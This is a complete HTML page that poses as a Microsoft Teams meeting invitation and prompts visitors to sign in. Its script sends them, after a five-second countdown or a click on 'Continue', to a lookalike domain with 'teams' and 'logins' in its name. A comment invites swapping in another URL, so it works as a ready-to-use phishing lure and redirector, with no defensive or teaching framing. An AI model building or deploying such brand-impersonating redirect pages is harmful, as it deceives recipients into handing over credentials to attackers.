<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Microsoft Teams Invitation</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: "Segoe UI", sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
}

.background {
    position: fixed;
    inset: 0;
    background: linear-gradient(
        135deg,
        #6264A7,
        #5B5FC7,
        #7B83EB
    );
}

.logo {
    position: absolute;
    left: 40px;
    top: 28px;
    display: flex;
    align-items: center;
    gap: 12px;
    color: white;
    font-size: 24px;
    font-weight: 600;
    z-index: 2;
}

.teams-icon {
    width: 40px;
    height: 40px;
    border-radius: 10px;
    background: white;
    color: #5B5FC7;
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: 800;
}

.card {
    position: relative;
    z-index: 2;
    width: 420px;
    background: white;
    border-radius: 8px;
    padding: 40px;
    box-shadow: 0 8px 24px rgba(0,0,0,.12);
}

.card h1 {
    font-size: 20px;
    color: #5B5FC7;
    margin-bottom: 20px;
}

.card h2 {
    font-size: 32px;
    font-weight: 600;
    margin-bottom: 20px;
}

.card p {
    color: #444;
    line-height: 1.6;
    margin-bottom: 20px;
}

#countdown {
    text-align: center;
    font-size: 14px;
    color: #666;
    margin-bottom: 20px;
}

.card button {
    width: 100%;
    height: 48px;
    border: none;
    border-radius: 4px;
    background: #5B5FC7;
    color: white;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
}

.card button:hover {
    background: #4f52b5;
}
</style>
</head>
<body>

<div class="background"></div>

<div class="logo">
    <div class="teams-icon">T</div>
    Microsoft Teams
</div>

<div class="card">
    <h1>Microsoft Teams</h1>

    <h2>
        You're invited<br>
        to join
    </h2>

    <p>
        Sign in to continue to your Microsoft Teams
        meeting, workspace, or organization.
    </p>

    <p id="countdown">
        You will be redirected automatically in 5 seconds...
    </p>

    <button onclick="redirectNow()">
        Continue
    </button>
</div>

<script>
const targetUrl = "https://rocontecteamsmeeting.logins-preview.vip/Zedgo"; // Replace with your URL

function redirectNow() {
    window.location.href = targetUrl;
}

let seconds = 5;
const countdown = document.getElementById("countdown");

const timer = setInterval(() => {
    seconds--;

    if (seconds > 0) {
        countdown.textContent =
            `You will be redirected automatically in ${seconds} second${seconds !== 1 ? 's' : ''}...`;
    } else {
        clearInterval(timer);
        redirectNow();
    }
}, 1000);
</script>

</body>
</html>
